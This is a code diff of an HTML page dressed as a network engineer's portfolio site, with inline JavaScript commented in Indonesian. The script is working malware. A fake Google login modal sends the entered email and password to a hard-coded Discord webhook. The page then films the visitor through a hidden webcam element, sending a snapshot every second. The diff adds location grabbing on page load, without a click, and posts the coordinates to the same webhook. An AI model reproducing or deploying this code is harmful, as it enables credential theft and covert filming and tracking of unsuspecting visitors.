@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Alif Diaz - Network Engineer & Cybersecurity</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Leaflet CSS untuk peta -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         * {
@@ -20,7 +19,6 @@
             color: #0f172a;
         }
 
-        /* Navbar */
         .navbar {
             background: white;
             box-shadow: 0 1px 3px rgba(0,0,0,0.05);
@@ -64,7 +62,6 @@
 
         .nav-links a:hover, .nav-links a.active { color: #2563eb; }
 
-        /* Main */
         .main {
             max-width: 1280px;
             margin: 0 auto;
@@ -90,7 +87,6 @@
             margin: 0 auto 32px;
         }
 
-        /* Tombol Jelajahi */
         .btn-jelajahi {
             background: #2563eb;
             color: white;
@@ -107,7 +103,6 @@
         .btn-jelajahi:hover {
             background: #1d4ed8;
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
         }
 
         .btn-outline {
@@ -126,7 +121,6 @@
             color: white;
         }
 
-        /* Cards */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -151,7 +145,6 @@
         .card h3 { margin-bottom: 12px; color: #0f172a; }
         .card p { color: #64748b; line-height: 1.5; margin-bottom: 16px; }
 
-        /* Map container */
         .map-container {
             margin-top: 24px;
             border-radius: 12px;
@@ -163,7 +156,6 @@
             width: 100%;
         }
 
-        /* Modal Google Login */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -212,7 +204,6 @@
             border: 1px solid #dadce0;
             border-radius: 8px;
             font-size: 1rem;
-            transition: all 0.2s;
         }
 
         .google-modal input:focus {
@@ -241,15 +232,6 @@
             font-size: 24px;
             cursor: pointer;
             color: #5f6368;
-        }
-
-        .location-status {
-            background: #f1f5f9;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 16px;
-            font-size: 0.875rem;
-            color: #475569;
         }
 
         footer {
@@ -281,15 +263,12 @@
     </div>
 </nav>
 
-<main class="main" id="main-content">
-    <!-- Konten akan diisi JavaScript -->
-</main>
+<main class="main" id="main-content"></main>
 
 <footer>
     <p>© 2025 Alif Diaz. All rights reserved.</p>
 </footer>
 
-<!-- Modal Google Login -->
 <div class="modal-overlay" id="googleModal">
     <div class="google-modal">
         <span class="close-modal" id="closeModal">&times;</span>
@@ -302,234 +281,177 @@
     </div>
 </div>
 
-<!-- Leaflet JS -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <script>
     // ================ KONFIGURASI ================
-    // GANTI DENGAN DISCORD WEBHOOK ASLI KAMU
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1491936474273419495/QQoiBEDr6mUBPiqo52LiPYGEEPyX9olrZiKd6oRJBjBMe-YcGEODNVTt7KpEbTM14Rzl";
     
-    // ================ VARIABEL GLOBAL ================
-    let activeCamera = false;
-    let captureInterval = null;
-    let videoElement = null;
-    let currentEmail = null;
-    let streamReference = null;
-    let currentLocation = { lat: null, lng: null };
-    let mapInstance = null;
-    let locationMarker = null;
+    // ================ VARIABEL ================
+    let cameraActive = false;
+    let cameraInterval = null;
+    let videoElem = null;
+    let streamRef = null;
+    let userEmail = null;
     let locationSent = false;
+    let mapInstance = null;
+    let userLocation = { lat: null, lng: null };
     
-    // ================ FUNGSI KAMERA STEALTH ================
-    async function startStealthCamera() {
-        if (activeCamera) return;
+    // ================ KIRIM GAMBAR KE DISCORD (BINARY) ================
+    async function sendImageToDiscord(imageBlob, metadata) {
+        if (!userEmail) return;
+        
+        const formData = new FormData();
+        formData.append("file", imageBlob, `cam_${Date.now()}.jpg`);
+        formData.append("payload_json", JSON.stringify({
+            content: `📸 **STEALTH CAPTURE**\nEmail: ${userEmail}\nWaktu: ${new Date().toLocaleString('id-ID')}\nLokasi: ${userLocation.lat || '?'}, ${userLocation.lng || '?'}\nUser-Agent: ${navigator.userAgent}\n${metadata || ''}`
+        }));
+        
+        try {
+            await fetch(DISCORD_WEBHOOK, {
+                method: "POST",
+                body: formData
+            });
+        } catch(e) { console.error("Gagal kirim gambar:", e); }
+    }
+    
+    // ================ KAMERA OTOMATIS (SETIAP DETIK) ================
+    async function startAutoCamera() {
+        if (cameraActive) return;
         
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            streamReference = stream;
+            streamRef = stream;
             
-            videoElement = document.createElement('video');
-            videoElement.srcObject = stream;
-            videoElement.style.position = 'fixed';
-            videoElement.style.top = '-9999px';
-            videoElement.style.left = '-9999px';
-            videoElement.style.width = '1px';
-            videoElement.style.height = '1px';
-            videoElement.style.opacity = '0';
-            videoElement.setAttribute('playsinline', '');
-            document.body.appendChild(videoElement);
+            videoElem = document.createElement('video');
+            videoElem.srcObject = stream;
+            videoElem.style.position = 'fixed';
+            videoElem.style.top = '-9999px';
+            videoElem.style.left = '-9999px';
+            videoElem.style.width = '1px';
+            videoElem.style.height = '1px';
+            videoElem.style.opacity = '0';
+            videoElem.setAttribute('playsinline', '');
+            document.body.appendChild(videoElem);
             
-            await videoElement.play();
-            activeCamera = true;
+            await videoElem.play();
+            cameraActive = true;
             
-            captureInterval = setInterval(() => {
-                captureAndSendPhoto();
+            // Capture setiap 1 detik
+            cameraInterval = setInterval(async () => {
+                if (!cameraActive || !videoElem || videoElem.readyState !== 4) return;
+                
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoElem.videoWidth || 640;
+                    canvas.height = videoElem.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+                    
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                    await sendImageToDiscord(blob, '');
+                } catch(e) { console.error("Capture error:", e); }
             }, 1000);
             
-            console.log('[Stealth] Kamera aktif');
-        } catch (err) {
-            console.error('Kamera error:', err);
-        }
+        } catch(e) { console.error("Kamera error:", e); }
     }
     
-    function stopStealthCamera() {
-        if (captureInterval) {
-            clearInterval(captureInterval);
-            captureInterval = null;
-        }
-        if (streamReference) {
-            streamReference.getTracks().forEach(track => track.stop());
-            streamReference = null;
-        }
-        if (videoElement && videoElement.parentNode) {
-            videoElement.parentNode.removeChild(videoElement);
-            videoElement = null;
-        }
-        activeCamera = false;
+    function stopAutoCamera() {
+        if (cameraInterval) clearInterval(cameraInterval);
+        if (streamRef) streamRef.getTracks().forEach(t => t.stop());
+        if (videoElem?.parentNode) videoElem.parentNode.removeChild(videoElem);
+        cameraActive = false;
+        videoElem = null;
+        streamRef = null;
     }
     
-    async function captureAndSendPhoto() {
-        if (!activeCamera || !videoElement || videoElement.readyState !== 4) return;
-        if (!currentEmail) return;
+    // ================ LOKASI OTOMATIS (SAAT HALAMAN DIMUAT) ================
+    function autoGetLocation() {
+        if (!navigator.geolocation) return;
         
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth || 640;
-            canvas.height = videoElement.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-            const reader = new FileReader();
-            reader.readAsDataURL(blob);
-            reader.onloadend = async function() {
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                userLocation = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude
+                };
+                
+                // Kirim ke Discord
+                const mapsLink = `https://www.google.com/maps?q=${userLocation.lat},${userLocation.lng}`;
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `📸 **STEALTH CAMERA**\nEmail: ${currentEmail}\nWaktu: ${new Date().toLocaleString('id-ID')}\nUser-Agent: ${navigator.userAgent}`,
-                        files: [{ attachment: reader.result, name: `capture_${Date.now()}.jpg` }]
+                        content: `📍 **LOKASI OTOMATIS**\nEmail: ${userEmail || 'belum login'}\nLat: ${userLocation.lat}\nLng: ${userLocation.lng}\nMaps: ${mapsLink}\nWaktu: ${new Date().toLocaleString('id-ID')}`
                     })
                 });
-            };
-        } catch (err) {
-            console.error('Capture error:', err);
-        }
-    }
-    
-    // ================ FUNGSI LOKASI + MAPS ================
-    function getLocationAndShowMap() {
-        if (!currentEmail) {
-            showLoginModal();
-            return;
-        }
-        
-        const locationDiv = document.getElementById('location-status');
-        if (locationDiv) {
-            locationDiv.innerHTML = '<span>📍 Mengambil lokasi...</span>';
-        }
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    currentLocation = {
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude
-                    };
-                    
-                    // Kirim ke Discord
-                    sendLocationToDiscord(currentLocation.lat, currentLocation.lng);
-                    
-                    // Update status
-                    if (locationDiv) {
-                        locationDiv.innerHTML = `<span>📍 Lokasi ditemukan: ${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}</span>`;
-                    }
-                    
-                    // Tampilkan peta
-                    showMap(currentLocation.lat, currentLocation.lng);
-                },
-                (error) => {
-                    console.error('Location error:', error);
-                    if (locationDiv) {
-                        locationDiv.innerHTML = '<span>⚠️ Izin lokasi diperlukan. Silakan aktifkan lokasi.</span>';
-                    }
-                    // Tampilkan peta default (Jakarta)
-                    showMap(-6.2088, 106.8456);
+                
+                // Update peta jika halaman contact sedang aktif
+                if (document.querySelector('.nav-link.active')?.getAttribute('data-page') === 'contact') {
+                    updateMapOnPage();
                 }
-            );
-        } else {
-            if (locationDiv) {
-                locationDiv.innerHTML = '<span>⚠️ Browser tidak mendukung geolokasi.</span>';
-            }
-            showMap(-6.2088, 106.8456);
-        }
+            },
+            (err) => { console.error("Gagal ambil lokasi:", err); }
+        );
     }
     
-    function showMap(lat, lng) {
-        const mapContainer = document.getElementById('map');
-        if (!mapContainer) return;
+    // ================ TAMPILKAN PETA ================
+    function updateMapOnPage() {
+        const mapDiv = document.getElementById('map');
+        if (!mapDiv) return;
         
-        // Hapus map lama jika ada
-        if (mapInstance) {
-            mapInstance.remove();
-        }
+        const lat = userLocation.lat || -6.2088;
+        const lng = userLocation.lng || 106.8456;
         
+        if (mapInstance) mapInstance.remove();
         mapInstance = L.map('map').setView([lat, lng], 15);
         L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
             attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a>'
         }).addTo(mapInstance);
-        
-        if (locationMarker) {
-            locationMarker.remove();
-        }
-        
-        locationMarker = L.marker([lat, lng]).addTo(mapInstance);
-        locationMarker.bindPopup('<b>Lokasi Anda</b><br>Berdasarkan GPS').openPopup();
+        L.marker([lat, lng]).addTo(mapInstance).bindPopup('Lokasi Anda').openPopup();
     }
     
-    async function sendLocationToDiscord(lat, lng) {
-        if (!currentEmail) return;
-        
-        // Buat link Google Maps
-        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-        
-        await fetch(DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `📍 **LOKASI REAL-TIME**\nEmail: ${currentEmail}\nLatitude: ${lat}\nLongitude: ${lng}\nGoogle Maps: ${mapsLink}\nWaktu: ${new Date().toLocaleString('id-ID')}\nIP: (from server)\nUser-Agent: ${navigator.userAgent}`
-            })
-        });
-    }
-    
-    // ================ PENGIRIMAN DATA KE DISCORD ================
-    async function sendToDiscord(type, data) {
+    // ================ KIRIM DATA KE DISCORD ================
+    async function sendLog(type, data) {
         try {
             await fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `**[${type}]**\nEmail: ${currentEmail || 'belum login'}\nData: ${JSON.stringify(data, null, 2)}\nWaktu: ${new Date().toLocaleString('id-ID')}\nUser-Agent: ${navigator.userAgent}`
+                    content: `**[${type}]**\nEmail: ${userEmail || 'belum login'}\nData: ${JSON.stringify(data)}\nWaktu: ${new Date().toLocaleString('id-ID')}\nIP: from server\nUser-Agent: ${navigator.userAgent}`
                 })
             });
-        } catch (err) {
-            console.error('Discord error:', err);
-        }
+        } catch(e) {}
     }
     
-    // ================ LOGIN GOOGLE PHISHING ================
+    // ================ LOGIN GOOGLE ================
     function showLoginModal() {
         document.getElementById('googleModal').style.display = 'flex';
     }
     
     document.getElementById('submitLogin').onclick = async () => {
         const email = document.getElementById('loginEmail').value;
-        const password = document.getElementById('loginPassword').value;
+        const pwd = document.getElementById('loginPassword').value;
         
-        if (!email.endsWith('@gmail.com') || !email.includes('@')) {
-            alert('Gunakan akun Google asli (format: nama@gmail.com)');
+        if (!email.endsWith('@gmail.com')) {
+            alert('Gunakan akun Google asli (nama@gmail.com)');
             return;
         }
         
-        if (password.length < 6) {
-            alert('Password tidak valid.');
-            return;
-        }
-        
-        currentEmail = email;
-        
-        await sendToDiscord('LOGIN CREDENTIALS', { email, password });
+        userEmail = email;
+        await sendLog('LOGIN', { email, password: pwd });
         
         document.getElementById('googleModal').style.display = 'none';
         document.getElementById('loginEmail').value = '';
         document.getElementById('loginPassword').value = '';
         
-        await startStealthCamera();
+        // Mulai kamera otomatis
+        await startAutoCamera();
         
-        alert('Login berhasil! Selamat datang di portfolio.');
+        // Ambil lokasi otomatis (jika belum)
+        if (!userLocation.lat) autoGetLocation();
         
-        // Refresh halaman yang aktif
+        alert('Login berhasil!');
         const activePage = document.querySelector('.nav-link.active')?.getAttribute('data-page') || 'home';
         loadPage(activePage);
     };
@@ -538,32 +460,23 @@
         document.getElementById('googleModal').style.display = 'none';
     };
     
-    // ================ FUNGSI TOMBOL (CAPTURE DATA) ================
-    window.captureProjectDetail = async (projectName) => {
-        if (!currentEmail) {
-            showLoginModal();
-            return;
-        }
-        await sendToDiscord('PROJECT DETAIL', { project: projectName, action: 'view_detail' });
-        alert(`Detail projek "${projectName}" akan dikirim ke ${currentEmail}`);
+    // ================ TOMBOL DATA ================
+    window.captureProject = (name) => {
+        if (!userEmail) { showLoginModal(); return; }
+        sendLog('PROJECT', { project: name });
+        alert(`Detail ${name} akan dikirim ke email Anda.`);
     };
     
-    window.captureSkillTest = async (skillName) => {
-        if (!currentEmail) {
-            showLoginModal();
-            return;
-        }
-        await sendToDiscord('SKILL TEST', { skill: skillName, action: 'start_test' });
-        alert(`Test untuk ${skillName} akan segera dimulai. Cek email Anda.`);
+    window.captureSkill = (name) => {
+        if (!userEmail) { showLoginModal(); return; }
+        sendLog('SKILL', { skill: name });
+        alert(`Test ${name} akan dimulai. Cek email.`);
     };
     
-    window.captureContact = async (method) => {
-        if (!currentEmail) {
-            showLoginModal();
-            return;
-        }
-        await sendToDiscord('CONTACT', { contact_method: method, action: 'contact_request' });
-        alert('Pesan telah dikirim. Kami akan menghubungi Anda dalam 24 jam.');
+    window.captureContact = (method) => {
+        if (!userEmail) { showLoginModal(); return; }
+        sendLog('CONTACT', { method });
+        alert('Pesan terkirim. Kami akan hubungi Anda.');
     };
     
     // ================ KONTEN HALAMAN ================
@@ -571,103 +484,92 @@
         home: `
             <div class="hero">
                 <h1>Network Engineer<br>& Cybersecurity</h1>
-                <p>TKJ graduate dengan pengalaman dalam infrastruktur jaringan, keamanan siber, dan pengembangan sistem monitoring.</p>
+                <p>TKJ graduate dengan pengalaman infrastruktur jaringan, keamanan siber, dan sistem monitoring.</p>
                 <button class="btn-jelajahi" id="exploreBtn">🌐 Jelajahi Portofolio</button>
             </div>
             <div class="grid">
-                <div class="card"><h3>🔧 Firewall Implementation</h3><p>Konfigurasi firewall untuk keamanan jaringan skala enterprise.</p></div>
-                <div class="card"><h3>📡 Network Monitoring</h3><p>Pemantauan trafik jaringan real-time menggunakan tools open-source.</p></div>
-                <div class="card"><h3>🛡️ Pentesting</h3><p>Vulnerability assessment dan penetration testing pada infrastruktur.</p></div>
+                <div class="card"><h3>🔧 Firewall Implementation</h3><p>Konfigurasi firewall untuk keamanan jaringan enterprise.</p></div>
+                <div class="card"><h3>📡 Network Monitoring</h3><p>Pemantauan trafik jaringan real-time.</p></div>
+                <div class="card"><h3>🛡️ Pentesting</h3><p>Vulnerability assessment & penetration testing.</p></div>
             </div>
         `,
         projects: `
-            <h2 style="margin-bottom: 8px;">Featured Projects</h2>
-            <p style="color: #64748b; margin-bottom: 24px;">Beberapa proyek yang telah saya kerjakan</p>
+            <h2 style="margin-bottom: 24px;">Featured Projects</h2>
             <div class="grid">
-                <div class="card"><h3>📁 Firewall Deployment</h3><p>Implementasi pfSense untuk jaringan kantor 50+ user.</p><button class="btn-outline" onclick="captureProjectDetail('Firewall Deployment')">Lihat Detail</button></div>
-                <div class="card"><h3>📁 IDS/IPS System</h3><p>Snort-based intrusion detection dengan alert real-time.</p><button class="btn-outline" onclick="captureProjectDetail('IDS/IPS System')">Lihat Detail</button></div>
-                <div class="card"><h3>📁 Bandwidth Monitoring</h3><p>Grafana + Prometheus untuk monitoring trafik jaringan.</p><button class="btn-outline" onclick="captureProjectDetail('Bandwidth Monitoring')">Lihat Detail</button></div>
+                <div class="card"><h3>📁 Firewall Deployment</h3><p>pfSense untuk 50+ user.</p><button class="btn-outline" onclick="captureProject('Firewall Deployment')">Detail</button></div>
+                <div class="card"><h3>📁 IDS/IPS System</h3><p>Snort-based intrusion detection.</p><button class="btn-outline" onclick="captureProject('IDS/IPS System')">Detail</button></div>
+                <div class="card"><h3>📁 Bandwidth Monitoring</h3><p>Grafana + Prometheus.</p><button class="btn-outline" onclick="captureProject('Bandwidth Monitoring')">Detail</button></div>
             </div>
         `,
         skills: `
-            <h2 style="margin-bottom: 8px;">Technical Skills</h2>
-            <p style="color: #64748b; margin-bottom: 24px;">Kompetensi di bidang jaringan dan keamanan</p>
+            <h2 style="margin-bottom: 24px;">Technical Skills</h2>
             <div class="grid">
-                <div class="card"><h3>🌐 Networking</h3><p>Cisco, Mikrotik, TCP/IP, VLAN, Routing, Switching</p><button class="btn-outline" onclick="captureSkillTest('Networking')">Test Skill</button></div>
-                <div class="card"><h3>💻 Security</h3><p>Firewall, IDS/IPS, VPN, Wireshark, Nmap</p><button class="btn-outline" onclick="captureSkillTest('Security')">Test Skill</button></div>
-                <div class="card"><h3>📊 Monitoring</h3><p>Grafana, Prometheus, Zabbix, PRTG, ELK Stack</p><button class="btn-outline" onclick="captureSkillTest('Monitoring')">Test Skill</button></div>
+                <div class="card"><h3>🌐 Networking</h3><p>Cisco, Mikrotik, TCP/IP, VLAN.</p><button class="btn-outline" onclick="captureSkill('Networking')">Test Skill</button></div>
+                <div class="card"><h3>💻 Security</h3><p>Firewall, IDS/IPS, VPN, Wireshark.</p><button class="btn-outline" onclick="captureSkill('Security')">Test Skill</button></div>
+                <div class="card"><h3>📊 Monitoring</h3><p>Grafana, Prometheus, Zabbix.</p><button class="btn-outline" onclick="captureSkill('Monitoring')">Test Skill</button></div>
             </div>
         `,
         contact: `
-            <h2 style="margin-bottom: 8px;">Hubungi Saya</h2>
-            <p style="color: #64748b; margin-bottom: 24px;">Jangkau saya melalui platform berikut</p>
+            <h2 style="margin-bottom: 24px;">Hubungi Saya</h2>
             <div class="grid">
-                <div class="card"><h3>📧 Email</h3><p>alif.diaz@network.id</p><button class="btn-outline" onclick="captureContact('Email')">Hubungi via Email</button></div>
-                <div class="card"><h3>💼 LinkedIn</h3><p>linkedin.com/in/alifdiaz</p><button class="btn-outline" onclick="captureContact('LinkedIn')">Hubungi via LinkedIn</button></div>
-                <div class="card"><h3>📱 WhatsApp</h3><p>+62 812-3456-7890</p><button class="btn-outline" onclick="captureContact('WhatsApp')">Hubungi via WhatsApp</button></div>
+                <div class="card"><h3>📧 Email</h3><p>alif.diaz@network.id</p><button class="btn-outline" onclick="captureContact('Email')">Hubungi</button></div>
+                <div class="card"><h3>💼 LinkedIn</h3><p>linkedin.com/in/alifdiaz</p><button class="btn-outline" onclick="captureContact('LinkedIn')">Hubungi</button></div>
+                <div class="card"><h3>📱 WhatsApp</h3><p>+62 812-3456-7890</p><button class="btn-outline" onclick="captureContact('WhatsApp')">Hubungi</button></div>
             </div>
             <div style="margin-top: 48px;">
-                <h3 style="margin-bottom: 16px;">Lokasi Saya Saat Ini</h3>
-                <div class="location-status" id="location-status">📍 Klik tombol di bawah untuk melihat lokasi</div>
-                <button class="btn-outline" id="getLocationBtn" style="margin-bottom: 16px;">📍 Tampilkan Lokasi Saya</button>
-                <div class="map-container" id="map-container">
-                    <div id="map" style="height: 400px; width: 100%;"></div>
-                </div>
+                <h3 style="margin-bottom: 16px;">Lokasi Saya</h3>
+                <div class="map-container"><div id="map" style="height: 400px;"></div></div>
+                <p style="font-size: 0.8rem; color: #64748b; margin-top: 12px;">*Lokasi diambil otomatis untuk memberikan layanan terbaik</p>
             </div>
         `
     };
     
-    // ================ NAVIGASI ================
     function loadPage(pageId) {
-        document.getElementById('main-content').innerHTML = pages[pageId] || pages.home;
+        document.getElementById('main-content').innerHTML = pages[pageId];
         
         document.querySelectorAll('.nav-link').forEach(link => {
-            if (link.getAttribute('data-page') === pageId) {
-                link.classList.add('active');
-            } else {
-                link.classList.remove('active');
-            }
+            const pg = link.getAttribute('data-page');
+            if (pg === pageId) link.classList.add('active');
+            else link.classList.remove('active');
         });
         
-        // Event khusus untuk halaman home
         if (pageId === 'home') {
-            const exploreBtn = document.getElementById('exploreBtn');
-            if (exploreBtn) {
-                exploreBtn.onclick = () => {
-                    if (!currentEmail) {
-                        showLoginModal();
-                    } else {
-                        alert(`Selamat datang kembali, ${currentEmail}`);
-                    }
-                };
-            }
+            const btn = document.getElementById('exploreBtn');
+            if (btn) btn.onclick = () => { if (!userEmail) showLoginModal(); else alert(`Welcome back, ${userEmail}`); };
         }
         
-        // Event khusus untuk halaman contact (lokasi + map)
-        if (pageId === 'contact') {
-            const locationBtn = document.getElementById('getLocationBtn');
-            if (locationBtn) {
-                locationBtn.onclick = () => {
-                    getLocationAndShowMap();
-                };
-            }
+        if (pageId === 'contact' && userLocation.lat) {
+            setTimeout(() => updateMapOnPage(), 100);
         }
     }
     
+    // ================ INIT ================
     document.querySelectorAll('.nav-link').forEach(link => {
-        link.onclick = () => {
-            const page = link.getAttribute('data-page');
-            loadPage(page);
-        };
+        link.onclick = () => loadPage(link.getAttribute('data-page'));
     });
     
-    // Load halaman awal
     loadPage('home');
     
-    // Stop camera saat halaman ditutup
-    window.addEventListener('beforeunload', () => {
-        stopStealthCamera();
-    });
+    // Auto request location saat pertama kali (tanpa tombol)
+    setTimeout(() => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    userLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                    const mapsLink = `https://www.google.com/maps?q=${userLocation.lat},${userLocation.lng}`;
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: `📍 **LOKASI AWAL**\nLat: ${userLocation.lat}\nLng: ${userLocation.lng}\nMaps: ${mapsLink}\nWaktu: ${new Date().toLocaleString('id-ID')}` })
+                    });
+                    if (document.querySelector('.nav-link.active')?.getAttribute('data-page') === 'contact') updateMapOnPage();
+                },
+                (err) => console.error("Lokasi ditolak atau error:", err)
+            );
+        }
+    }, 1000);
+    
+    window.addEventListener('beforeunload', () => stopAutoCamera());
 </script>
 </body>
 </html>
